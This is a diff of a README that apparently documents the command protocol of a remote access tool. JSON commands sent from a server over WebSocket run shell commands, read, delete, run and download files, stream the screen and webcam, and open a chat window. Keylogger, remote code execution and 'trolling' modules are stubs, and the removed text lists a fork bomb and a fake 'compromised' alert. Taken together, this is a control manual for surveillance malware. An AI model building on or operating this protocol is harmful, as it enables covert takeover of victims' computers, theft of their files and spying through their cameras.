@@ -1,200 +1,220 @@
-# Client JSON API Scheme
+# Client JSON API (v0 — matches current implementation)
 
-This document describes the JSON API scheme used for interacting with the client. All messages must be in JSON format and sent via WebSocket.
+**Transport:** WebSocket over **TLS** (`wss://{domain}:{port}/ws/{client_id}`), where `{client_id}` is `System::host_name()`.
 
-## General Command Structure
+* Immediately after the connection is established, the client sends **one `Text` frame** with system information (CSV-like string, **not JSON**):
+  `"{host}, {os_short}, {os_long}, {kernel}, {cpu_model}, { {gpu1, gpu2} }, {mem_total}"`
 
-Each command sent to the client must adhere to the following structure:
+* Server-to-client commands are always JSON in a `Text` frame:
 
 ```json
 {
   "module": "MODULE_NAME",
-  "args": {
-    /* Arguments specific to the module */
-  }
+  "args": { /* module-specific fields */ }
 }
 ```
 
-- `module`: A string identifying the target module to handle the command.
-- `args`: A JSON object containing the parameters required for the module's operation.
+> `"module"` is the **feature name** used at build time:
+> `"remote_cmd"`, `"files"`, `"remote_screen"`, `"webcam"`, `"chat"`, `"keylogger"`, `"remote_code_execution"`, `"trolling"`.
+> A module is available only if the feature is enabled **and** the client registered it in the `Dispatcher`.
+
+Client responses can be:
+
+* `Text` (plain string)
+* `Binary` (for webcam/screen frames and `files:DOWN`; formats described below)
 
 ---
 
-## Module Definitions
+## Modules
 
-### 1. Remote Shell (`RSH`)
+### 1) `remote_cmd`
 
-Executes shell commands on the target machine.
+Runs commands in a shell.
 
-| `args` Key | Type   | Required? | Description                                                                                       |
-| :--------- | :----- | :-------- | :------------------------------------------------------------------------------------------------ |
-| `command`  | String | Yes       | The command to be executed.                                                                       |
-| `shell`    | String | No        | The shell to use. Can be `"cmd"`, `"powershell"`, `"sh"`, or `"bash"`. Defaults depend on the OS. |
+**Args**
 
-**Example:**
+| key     | type   | required | notes                                                                                 |
+| ------- | ------ | -------- | ------------------------------------------------------------------------------------- |
+| command | string | yes      | command line to execute                                                               |
+| shell   | string | no       | `"powershell"`, `"bash"`, `"sh"`, or `"cmd"`; default: Windows=`cmd /C`, Unix=`sh -c` |
+
+**Response**
+
+* `Text`: concatenated `stdout || stderr` (decoded as UTF-8 lossy).
+
+**Example**
 
 ```json
-{
-  "module": "RSH",
-  "args": {
-    "command": "Get-NetIPAddress -AddressFamily IPv4",
-    "shell": "powershell"
-  }
-}
+{ "module": "remote_cmd", "args": { "command": "whoami", "shell": "sh" } }
 ```
 
 ---
 
-### 2. File System (`FS`)
+### 2) `files`
 
-Manages files and directories on the target machine.
+File/dir operations.
 
-| `args` Key  | Type   | Required?   | Description                                           |
-| :---------- | :----- | :---------- | :---------------------------------------------------- |
-| `operation` | String | Yes         | Action: `"GET"`, `"DEL"`, `"MOV"`, `"DOWN"`, `"RUN"`. |
-| `path`      | String | Yes         | The primary path for the operation.                   |
-| `to`        | String | For `"MOV"` | The destination path for a move/rename operation.     |
+**Args**
 
-**Operations Description:**
+| key       | type   | required | notes                                        |
+| --------- | ------ | -------- | -------------------------------------------- |
+| operation | string | yes      | `"GET"`, `"DEL"`, `"MOV"`, `"DOWN"`, `"RUN"` |
+| path      | string | yes      | source path                                  |
+| to        | string | for MOV  | destination path                             |
 
-- `GET`: Reads a file's content or gets a list of files and folders in a directory.
-- `DEL`: Deletes a file or directory (recursively).
-- `MOV`: Moves or renames a file/directory.
-- `DOWN`: Downloads a file or folder (recursively) to the host machine.
-- `RUN`: Runs an executable file.
+**Responses**
 
-**Example (List files):**
+* `GET`:
+
+  * if `path` is a file: `Text` = file contents (assumes UTF-8; binary files will garble)
+  * if directory: `Text` = lines `"name (File|Dir)"`
+* `DEL`: `Text` = `"OK deleted {path}"` or error string
+* `MOV`: `Text` = `"OK moved"` or `"NO not moved: {err}"`
+* `RUN`: `Text` = `"OK runned"` or `"NO not runned: {err}"`
+* `DOWN`:
+
+  * `Binary`: **raw ad-hoc format** — `filename` (UTF-8) + single byte `\n` (0x0A) + `{file_bytes}`
+    **No length/version/CRC; `\n` in filename unsupported; not safe for arbitrary binary names.**
+
+**Examples**
 
 ```json
-{
-  "module": "FS",
-  "args": {
-    "operation": "GET",
-    "path": "C:\\Users\\Public\\Documents"
-  }
-}
+{ "module": "files", "args": { "operation": "GET", "path": "/tmp" } }
+{ "module": "files", "args": { "operation": "MOV", "path": "/tmp/a", "to": "/tmp/b" } }
+{ "module": "files", "args": { "operation": "DOWN", "path": "/var/log/syslog" } }
 ```
 
 ---
 
-### 3. Remote Screen (`RS`)
+### 3) `remote_screen`
 
-Handles screen capture and streaming. _(Note: Schema is based on intended functionality; implementation is pending)_
+Screenshot & streaming.
 
-| `args` Key | Type   | Required?            | Description                                                                                     |
-| :--------- | :----- | :------------------- | :---------------------------------------------------------------------------------------------- |
-| `action`   | String | Yes                  | `"screenshot"` for a single frame, `"stream_start"` to begin streaming, `"stream_stop"` to end. |
-| `fps`      | Number | For `"stream_start"` | Frames per second for the stream.                                                               |
+**Args**
 
-**Example (Take screenshot):**
+| key         | type    | required | notes                                             |
+| ----------- | ------- | -------- | ------------------------------------------------- |
+| action      | string  | yes      | `"screenshot"`, `"stream_start"`, `"stream_stop"` |
+| compressing | boolean | no       | default `true`                                    |
+
+**Responses**
+
+* `"screenshot"`: `Binary` frame:
+  **format:** leading byte `0x02` + `payload`.
+  `payload` = JPEG if `compressing=true`, otherwise raw RGB24.
+* `"stream_start"`: starts periodic `Binary` frames with the same `0x02` prefix (about 10 FPS; hardcoded `frame_interval=100ms`).
+* `"stream_stop"`: stops the stream.
+
+**Examples**
 
 ```json
-{
-  "module": "RS",
-  "args": {
-    "action": "screenshot"
-  }
-}
+{ "module": "remote_screen", "args": { "action": "screenshot" } }
+{ "module": "remote_screen", "args": { "action": "stream_start" } }
+{ "module": "remote_screen", "args": { "action": "stream_stop" } }
 ```
 
 ---
 
-### 4. Task Manager (`TM`)
+### 4) `webcam`
 
-Manages processes on the target machine. _(Note: Schema is based on intended functionality; implementation is pending)_
+Photo/video from the camera.
 
-| `args` Key | Type   | Required?    | Description                                                     |
-| :--------- | :----- | :----------- | :-------------------------------------------------------------- |
-| `action`   | String | Yes          | `"list"` to get all processes, `"kill"` to terminate a process. |
-| `pid`      | Number | For `"kill"` | The Process ID (PID) to terminate.                              |
+**Args**
 
-**Example (Kill a process):**
+| key         | type    | required | notes                                      |
+| ----------- | ------- | -------- | ------------------------------------------ |
+| mode        | string  | yes      | `"photo"`, `"video_start"`, `"video_stop"` |
+| compressing | boolean | no       | for `"photo"`; default `true`              |
+
+**Responses**
+
+* `"photo"`: `Binary` frame: **format:** leading byte `0x01` + `payload` (JPEG if `compressing=true`, else RGB24).
+* `"video_start"`: periodic `Binary` frames with `0x01` prefix (JPEG).
+* `"video_stop"`: stops the stream.
+
+**Examples**
 
 ```json
-{
-  "module": "TM",
-  "args": {
-    "action": "kill",
-    "pid": 4125
-  }
-}
+{ "module": "webcam", "args": { "mode": "photo" } }
+{ "module": "webcam", "args": { "mode": "video_start" } }
+{ "module": "webcam", "args": { "mode": "video_stop" } }
 ```
 
 ---
 
-### 5. Trolling (`TRL`)
+### 5) `chat`
 
-Performs various "fun" actions on the target. _(Note: Schema is based on intended functionality; implementation is pending)_
+Launches a local GUI chat window on the client.
 
-| `args` Key | Type   | Required?                              | Description                                                            |
-| :--------- | :----- | :------------------------------------- | :--------------------------------------------------------------------- |
-| `action`   | String | Yes                                    | `"message_box"`, `"open_link"`, `"set_clipboard"`, `"fork_bomb"`, etc. |
-| `title`    | String | For `"message_box"`                    | The title of the message box window.                                   |
-| `text`     | String | For `"message_box"`, `"set_clipboard"` | The content for the message or clipboard.                              |
-| `url`      | String | For `"open_link"`                      | The URL to open in the default browser.                                |
+**Args**
 
-**Example (Show message box):**
+| key     | type   | required | notes                                 |
+| ------- | ------ | -------- | ------------------------------------- |
+| action  | string | yes      | `"start"`, `"send"`, `"stop"`         |
+| message | string | for send | message text (from **host** into GUI) |
+
+**Behavior & Responses**
+
+* `"start"`: spawns the GUI window; **no explicit ACK** is sent back.
+* `"send"`: appends a **host-authored** message into the local GUI; **no ACK**.
+* User-typed messages from the GUI are sent back to the server as `Text` JSON:
+
+  ```json
+  { "type": "chat_message", "author": "client", "text": "..." }
+  ```
+* `"stop"`: closes the GUI and clears state; **no ACK**.
+
+**Examples**
 
 ```json
-{
-  "module": "TRL",
-  "args": {
-    "action": "message_box",
-    "title": "System Security Alert",
-    "text": "Your system has been compromised."
-  }
-}
+{ "module": "chat", "args": { "action": "start" } }
+{ "module": "chat", "args": { "action": "send", "message": "Hello!" } }
+{ "module": "chat", "args": { "action": "stop" } }
 ```
 
 ---
 
-### 6. Keylogger (`KL`)
+### 6) `keylogger` — **stub**
 
-Controls the keylogging functionality. _(Note: Schema is based on intended functionality; implementation is pending)_
+Feature exists; actor is a no-op.
 
-| `args` Key | Type   | Required? | Description                                                           |
-| :--------- | :----- | :-------- | :-------------------------------------------------------------------- |
-| `action`   | String | Yes       | `"start"`, `"stop"`, or `"dump"` (to send captured keys to the host). |
-
-**Example (Get all logged keys):**
-
-```json
-{
-  "module": "KL",
-  "args": {
-    "action": "dump"
-  }
-}
-```
+**Args (planned, not implemented)**
+`action`: `"start" | "stop" | "dump"` — currently **not implemented**.
 
 ---
 
-### 7. Chat (`CH`)
+### 7) `remote_code_execution` — **stub**
 
-Manages a two-way chat with the target machine.
+Actor declared; `handler` is `todo!()`.
 
-| `args` Key | Type   | Required?    | Description                                           |
-| :--------- | :----- | :----------- | :---------------------------------------------------- |
-| `action`   | String | Yes          | `"start"`, `"send"`, `"stop"`.                        |
-| `message`  | String | For `"send"` | The message text to send to the target's chat window. |
-
-**Example (Start chat):**
-
-```json
-{
-  "module": "CH",
-  "args": {
-    "action": "start"
-  }
-}
 ---
 
-### 8. Other Modules (Not Yet Implemented)
+### 8) `trolling` — **stub**
 
-The following modules are defined in the router but their implementation is pending.
+Actor declared; `handler` is `todo!()`.
 
-| Module | Name                  | Intended Purpose                                              |
-| :----- | :-------------------- | :------------------------------------------------------------ |
-| `AD`   | Audio                 | Record and stream audio from the microphone.                  |
-| `RCE`  | Remote Code Execution | Execute arbitrary code (e.g., scripts) on the target machine. |
+---
+
+## Errors & edge cases (current behavior)
+
+* If a module isn’t registered (feature disabled or not added in `Dispatcher`), the client **does not** send a structured error; it logs locally and the server gets **no response**.
+* Most module errors are plain `Text` strings (`"NO not moved: …"`, etc.). There is **no unified error schema**.
+* Binary streams (`webcam`, `remote_screen`) are **unframed** beyond a single-byte prefix (`0x01`/`0x02`); no length/version/CRC.
+* `files:DOWN` uses a **fragile** format: `"name\nbytes"`. UTF-8/binary newline in names will break it.
+
+---
+
+## Quick reference (module strings)
+
 ```
+remote_cmd
+files
+remote_screen
+webcam
+chat
+keylogger              (stub)
+remote_code_execution  (stub)
+trolling               (stub)
+```
+
+---
